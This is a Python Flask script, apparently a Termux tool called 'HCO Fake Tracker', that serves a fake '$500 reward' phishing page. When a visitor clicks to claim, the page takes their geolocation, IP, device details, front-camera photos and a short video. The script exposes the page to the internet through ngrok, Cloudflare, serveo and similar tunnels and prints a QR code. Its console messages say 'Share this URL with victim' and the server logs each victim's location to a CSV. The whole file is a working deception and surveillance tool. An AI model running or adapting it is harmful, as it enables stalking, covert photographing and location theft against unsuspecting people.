from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
import requests
import threading
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import qrcode
    from PIL import Image
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama requests")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"

# Gallery paths
GALLERY_PATHS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/HCO_Tracker", 
    "/sdcard/Pictures/HCO_Tracker",
    "/sdcard/Download/HCO_Tracker"
]

for path in GALLERY_PATHS:
    try:
        os.makedirs(path, exist_ok=True)
    except:
        pass

app = Flask(__name__)
public_url = None

def show_tool_lock_screen():
    """Show the tool lock screen"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
    
    # Quick countdown
    for i in range(3, 0, -1):
        print(f"{Fore.RED}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(1)
    
    youtube_url = "https://www.youtube.com/@hackers_colony_tech"
    print(f"\n{Fore.GREEN}🎬 Opening YouTube...{Style.RESET_ALL}")
    
    try:
        subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
    except:
        print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}🚨 Press Enter AFTER subscribing...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Tool unlocked!{Style.RESET_ALL}")
    time.sleep(1)

def install_ngrok():
    """Install ngrok with better methods"""
    try:
        # Check if already installed
        result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            return True
    except:
        pass
    
    print(f"{Fore.YELLOW}📥 Installing ngrok...{Style.RESET_ALL}")
    
    methods = [
        ['pkg', 'install', 'ngrok', '-y'],
        ['apt', 'install', 'ngrok', '-y'],
        ['pkg', 'update', '&&', 'pkg', 'install', 'ngrok', '-y']
    ]
    
    for method in methods:
        try:
            print(f"{Fore.CYAN}🔄 Trying: {' '.join(method)}{Style.RESET_ALL}")
            result = subprocess.run(method, capture_output=True, text=True, timeout=120)
            if result.returncode == 0:
                # Verify installation
                try:
                    subprocess.run(['ngrok', '--version'], capture_output=True, timeout=10)
                    print(f"{Fore.GREEN}✅ ngrok installed successfully{Style.RESET_ALL}")
                    return True
                except:
                    continue
        except:
            continue
    
    print(f"{Fore.RED}❌ Failed to install ngrok{Style.RESET_ALL}")
    return False

def install_cloudflared():
    """Install cloudflared"""
    try:
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            return True
    except:
        pass
    
    print(f"{Fore.YELLOW}📥 Installing cloudflared...{Style.RESET_ALL}")
    
    try:
        result = subprocess.run(['pkg', 'install', 'cloudflared', '-y'], 
                              capture_output=True, text=True, timeout=120)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ cloudflared installed{Style.RESET_ALL}")
            return True
    except:
        pass
    
    print(f"{Fore.RED}❌ Failed to install cloudflared{Style.RESET_ALL}")
    return False

def start_ngrok_tunnel():
    """Start ngrok and get public URL"""
    global public_url
    
    print(f"{Fore.CYAN}🚀 Starting NGROK tunnel...{Style.RESET_ALL}")
    
    # Kill existing ngrok
    subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
    time.sleep(2)
    
    try:
        # Start ngrok in background
        process = subprocess.Popen([
            'ngrok', 'http', str(PORT),
            '--log=stdout',
            '--region=us'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"{Fore.YELLOW}⏳ Waiting for ngrok (15 seconds)...{Style.RESET_ALL}")
        time.sleep(15)
        
        # Get URL from ngrok API
        for attempt in range(8):
            try:
                response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    for tunnel in data.get('tunnels', []):
                        if tunnel['proto'] == 'https':
                            public_url = tunnel['public_url']
                            print(f"{Fore.GREEN}✅ NGROK URL: {public_url}{Style.RESET_ALL}")
                            return public_url
            except:
                pass
            time.sleep(3)
        
        print(f"{Fore.RED}❌ Could not get ngrok URL{Style.RESET_ALL}")
        return None
        
    except Exception as e:
        print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
        return None

def start_cloudflare_tunnel():
    """Start Cloudflare tunnel"""
    global public_url
    
    print(f"{Fore.CYAN}🚀 Starting CLOUDFLARE tunnel...{Style.RESET_ALL}")
    
    subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
    time.sleep(2)
    
    try:
        # Start cloudflared
        process = subprocess.Popen([
            'cloudflared', 'tunnel', 
            '--url', f'http://localhost:{PORT}',
            '--metrics', 'localhost:49539'
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        print(f"{Fore.YELLOW}⏳ Waiting for Cloudflare (20 seconds)...{Style.RESET_ALL}")
        time.sleep(20)
        
        # Try to get URL from output
        for _ in range(10):
            try:
                line = process.stderr.readline()
                if '.trycloudflare.com' in line:
                    import re
                    urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                    if urls:
                        public_url = urls[0]
                        print(f"{Fore.GREEN}✅ CLOUDFLARE URL: {public_url}{Style.RESET_ALL}")
                        return public_url
            except:
                pass
            time.sleep(2)
        
        print(f"{Fore.YELLOW}⚠️ Cloudflare tunnel started but URL not captured{Style.RESET_ALL}")
        return "cloudflare_active"
        
    except Exception as e:
        print(f"{Fore.RED}❌ Cloudflare error: {e}{Style.RESET_ALL}")
        return None

def start_localhost_run():
    """Start localhost.run tunnel"""
    global public_url
    
    print(f"{Fore.CYAN}🚀 Starting LOCALHOST.RUN tunnel...{Style.RESET_ALL}")
    
    try:
        # Start localhost.run with timeout
        result = subprocess.run([
            'ssh', '-o', 'StrictHostKeyChecking=no',
            '-o', 'ConnectTimeout=30',
            '-R', '80:localhost:5000',
            'nokey@localhost.run'
        ], capture_output=True, text=True, timeout=25)
        
        output = result.stdout + result.stderr
        
        # Extract URL
        import re
        urls = re.findall(r'https://[a-zA-Z0-9-]+\.localhost\.run', output)
        if urls:
            public_url = urls[0]
            print(f"{Fore.GREEN}✅ LOCALHOST.RUN URL: {public_url}{Style.RESET_ALL}")
            return public_url
        else:
            print(f"{Fore.YELLOW}⚠️ Could not extract URL from output{Style.RESET_ALL}")
            return None
            
    except subprocess.TimeoutExpired:
        print(f"{Fore.YELLOW}⚠️ localhost.run timeout - checking if it worked...{Style.RESET_ALL}")
        return "localhost_timeout"
    except Exception as e:
        print(f"{Fore.RED}❌ localhost.run error: {e}{Style.RESET_ALL}")
        return None

def start_serveo():
    """Start serveo tunnel"""
    global public_url
    
    print(f"{Fore.CYAN}🚀 Starting SERVEO tunnel...{Style.RESET_ALL}")
    
    try:
        result = subprocess.run([
            'ssh', '-o', 'StrictHostKeyChecking=no',
            '-o', 'ConnectTimeout=20', 
            '-R', '80:localhost:5000',
            'serveo.net'
        ], capture_output=True, text=True, timeout=25)
        
        output = result.stdout + result.stderr
        
        import re
        urls = re.findall(r'https://[a-zA-Z0-9-]+\.serveo\.net', output)
        if urls:
            public_url = urls[0]
            print(f"{Fore.GREEN}✅ SERVEO URL: {public_url}{Style.RESET_ALL}")
            return public_url
        return None
        
    except Exception as e:
        print(f"{Fore.RED}❌ Serveo error: {e}{Style.RESET_ALL}")
        return None

def start_localtonet():
    """Start localtonet tunnel"""
    global public_url
    
    print(f"{Fore.CYAN}🚀 Starting LOCALTONET tunnel...{Style.RESET_ALL}")
    
    try:
        result = subprocess.run([
            'ssh', '-o', 'StrictHostKeyChecking=no',
            '-o', 'ConnectTimeout=20',
            '-R', 'hco-tracker:80:localhost:5000',
            'ssh.localtonet.com'
        ], capture_output=True, text=True, timeout=25)
        
        output = result.stdout + result.stderr
        print(f"{Fore.CYAN}📡 Localtonet output: {output}{Style.RESET_ALL}")
        
        # Localtonet usually shows URL in format: https://hco-tracker-xxxx.localtonet.com
        import re
        urls = re.findall(r'https://[a-zA-Z0-9-]+\.localtonet\.com', output)
        if urls:
            public_url = urls[0]
            print(f"{Fore.GREEN}✅ LOCALTONET URL: {public_url}{Style.RESET_ALL}")
            return public_url
        return None
        
    except Exception as e:
        print(f"{Fore.RED}❌ Localtonet error: {e}{Style.RESET_ALL}")
        return None

def get_public_url_force():
    """Force get public URL using multiple services"""
    global public_url
    
    print(f"{Fore.CYAN}{'🚀 FORCING WAN TUNNEL CREATION ':=^60}{Style.RESET_ALL}")
    
    # List of tunnel methods to try
    tunnel_methods = [
        ("NGROK", start_ngrok_tunnel),
        ("LOCALHOST.RUN", start_localhost_run), 
        ("SERVEO", start_serveo),
        ("LOCALTONET", start_localtonet),
        ("CLOUDFLARE", start_cloudflare_tunnel)
    ]
    
    # Try each method until we get a public URL
    for service_name, tunnel_func in tunnel_methods:
        print(f"\n{Fore.YELLOW}🔄 Trying {service_name}...{Style.RESET_ALL}")
        
        # Install required service first
        if service_name == "NGROK":
            if not install_ngrok():
                continue
        elif service_name == "CLOUDFLARE":
            if not install_cloudflared():
                continue
        
        result = tunnel_func()
        if result and result not in ["cloudflare_active", "localhost_timeout"]:
            return result, service_name
        elif result in ["cloudflare_active", "localhost_timeout"]:
            print(f"{Fore.YELLOW}⚠️ {service_name} started but URL not captured{Style.RESET_ALL}")
            continue
    
    # If all tunnels fail, return local IP
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    print(f"{Fore.RED}❌ ALL TUNNELS FAILED! Using local URL{Style.RESET_ALL}")
    return local_url, "local"

def display_banner():
    """Display banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.GREEN}{' HCO FAKE TRACKER '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{' by Azhar '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

def display_qr_in_termux(url):
    """Display QR code"""
    try:
        qr = qrcode.QRCode(version=1, box_size=2, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        
        qr_matrix = qr.get_matrix()
        qr_text = ""
        for row in qr_matrix:
            line = ""
            for cell in row:
                line += "██" if cell else "  "
            qr_text += line + "\n"
        
        print(f"\n{Fore.GREEN}📲 QR Code:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 URL: {url}{Style.RESET_ALL}")
        
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}💾 QR saved: {QR_PNG}{Style.RESET_ALL}")
        return True
    except:
        return False

def get_local_ip():
    """Get local IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def test_url(url):
    """Test if URL is accessible"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}✅ URL accessible!{Style.RESET_ALL}")
            return True
    except:
        print(f"{Fore.YELLOW}⚠️ URL test failed{Style.RESET_ALL}")
    return False

# HTML template (same as before)
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎁 Claim Your $500 Reward!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid gold;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .trophy { 
            font-size: 80px; 
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .title { 
            font-size: 32px; 
            font-weight: bold;
            margin-bottom: 10px;
            color: gold;
        }
        .reward { 
            font-size: 48px; 
            font-weight: bold;
            color: #FFD700;
            margin: 20px 0;
        }
        .btn {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: scale(1.05);
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .processing { background: #ff9800; display: block; }
        .success { background: #4caf50; display: block; }
        .error { background: #f44336; display: block; }
        .data {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 15px 0;
            text-align: left;
            display: none;
        }
        .data-item { 
            margin: 10px 0; 
            padding: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
        }
        #cameraPreview {
            width: 100%;
            max-width: 300px;
            border: 2px solid gold;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🏆</div>
        <div class="title">CONGRATULATIONS!</div>
        <div>You Won $500 Reward!</div>
        
        <div class="reward">$500</div>
        <div>Cash Prize + Gift Card</div>
        
        <button class="btn" id="claimBtn" onclick="startVerification()">
            🎁 CLAIM YOUR REWARD NOW
        </button>
        
        <video id="cameraPreview" autoplay muted playsinline></video>
        
        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>📊 Reward Claimed Successfully!</h3>
            <div class="data-item">📍 Location: <span id="loc">Processing...</span></div>
            <div class="data-item">🌐 IP: <span id="ip">Processing...</span></div>
            <div class="data-item">📱 Device: <span id="device">Processing...</span></div>
            <div style="text-align: center; margin-top: 15px; color: gold;">
                ✅ Your reward will be processed within 24 hours
            </div>
        </div>
    </div>

    <script>
        const collectedData = {
            deviceInfo: {},
            location: null,
            photos: [],
            video: null
        };

        async function startVerification() {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Processing...';
            status.className = 'status processing';
            status.innerHTML = '🔄 Starting verification...';
            status.style.display = 'block';

            try {
                // Get device info
                collectedData.deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                // Get location
                status.innerHTML = '📍 Getting location...';
                collectedData.location = await getLocation();

                // Get IP
                status.innerHTML = '🌐 Getting IP...';
                collectedData.ipInfo = await getIPInfo();

                // Access camera
                status.innerHTML = '📸 Accessing camera...';
                await accessCameraAndCapture();

                // Send data
                status.innerHTML = '📡 Sending data...';
                await sendAllData();

                // Success
                status.className = 'status success';
                status.innerHTML = '✅ Reward claimed successfully!';
                document.getElementById('data').style.display = 'block';
                btn.style.display = 'none';

            } catch (error) {
                status.className = 'status error';
                status.innerHTML = '❌ Error: ' + error.message;
                btn.disabled = false;
                btn.innerHTML = '🎁 TRY AGAIN';
                await sendAllData();
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    }),
                    (error) => resolve({ error: error.message })
                );
            });
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return { ip: data.ip };
            } catch {
                return { error: 'Could not fetch IP' };
            }
        }

        async function accessCameraAndCapture() {
            const video = document.getElementById('cameraPreview');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                video.srcObject = stream;
                video.style.display = 'block';
                await video.play();
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Capture 3 photos
                for (let i = 0; i < 3; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    collectedData.photos.push(canvas.toDataURL('image/jpeg'));
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                
                // Record video
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = () => collectedData.video = reader.result;
                    reader.readAsDataURL(blob);
                };
                
                recorder.start();
                await new Promise(resolve => setTimeout(resolve, 5000));
                recorder.stop();
                
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                
            } catch (error) {
                throw new Error('Camera access denied');
            }
        }

        async function sendAllData() {
            const payload = {
                ...collectedData,
                timestamp: new Date().toISOString()
            };
            
            try {
                await fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Failed to send data');
            }
        }

        // Update display
        if (collectedData.deviceInfo) {
            document.getElementById('device').textContent = collectedData.deviceInfo.platform || 'Unknown';
        }
        if (collectedData.location) {
            if (collectedData.location.latitude) {
                document.getElementById('loc').textContent = 
                    `Lat: ${collectedData.location.latitude}, Lon: ${collectedData.location.longitude}`;
            } else {
                document.getElementById('loc').textContent = 'Location access denied';
            }
        }
        if (collectedData.ipInfo) {
            document.getElementById('ip').textContent = collectedData.ipInfo.ip || 'Unknown';
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"\n{Fore.GREEN}🎯 VICTIM ACCESSED - IP: {client_ip}{Style.RESET_ALL}")
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json()
        
        # Extract and save data
        lat = data.get("location", {}).get("latitude")
        lon = data.get("location", {}).get("longitude")
        ip = data.get("ipInfo", {}).get("ip", "Unknown")
        photos = data.get("photos", [])
        
        # Save to CSV
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip,
            'latitude': lat,
            'longitude': lon,
            'photos': len(photos),
            'video': 'Yes' if data.get('video') else 'No'
        }
        
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        print(f"\n{Fore.GREEN}🎯 DATA CAPTURED - IP: {ip}, Location: {lat}, {lon}{Style.RESET_ALL}")
        return jsonify({"status": "success"})
        
    except Exception as e:
        print(f"{Fore.RED}❌ Report Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error"}), 500

def main():
    global public_url
    
    # Show lock screen
    show_tool_lock_screen()
    display_banner()
    
    print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 WAN TUNNEL OPTIONS ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. Auto (Try all tunnels){Style.RESET_ALL}")
    print(f"{Fore.CYAN}2. Ngrok Only{Style.RESET_ALL}")
    print(f"{Fore.BLUE}3. Localhost.run Only{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}4. Serveo Only{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-4): {Style.RESET_ALL}").strip()
    
    final_url = None
    service_name = "Unknown"
    
    if choice == '1':
        # Auto - try all
        final_url, service_name = get_public_url_force()
    elif choice == '2':
        # Ngrok only
        if install_ngrok():
            final_url = start_ngrok_tunnel()
            service_name = "NGROK"
    elif choice == '3':
        # Localhost.run only
        final_url = start_localhost_run()
        service_name = "LOCALHOST.RUN"
    elif choice == '4':
        # Serveo only
        final_url = start_serveo()
        service_name = "SERVEO"
    else:
        # Default to auto
        final_url, service_name = get_public_url_force()
    
    # Fallback to local if no public URL
    if not final_url or final_url in ["cloudflare_active", "localhost_timeout"]:
        local_ip = get_local_ip()
        final_url = f"http://{local_ip}:{PORT}"
        service_name = "LOCAL"
        print(f"{Fore.RED}❌ Using local URL (only same WiFi){Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 Final URL: {final_url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🔧 Service: {service_name}{Style.RESET_ALL}")
    
    if service_name != "LOCAL":
        print(f"{Fore.GREEN}✅ This works on ANY device and ANY network!{Style.RESET_ALL}")
        test_url(final_url)
    else:
        print(f"{Fore.RED}❌ Only works on same WiFi network{Style.RESET_ALL}")
    
    display_qr_in_termux(final_url)
    
    print(f"\n{Fore.YELLOW}🚀 Share this URL with victim{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for victim...{Style.RESET_ALL}")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
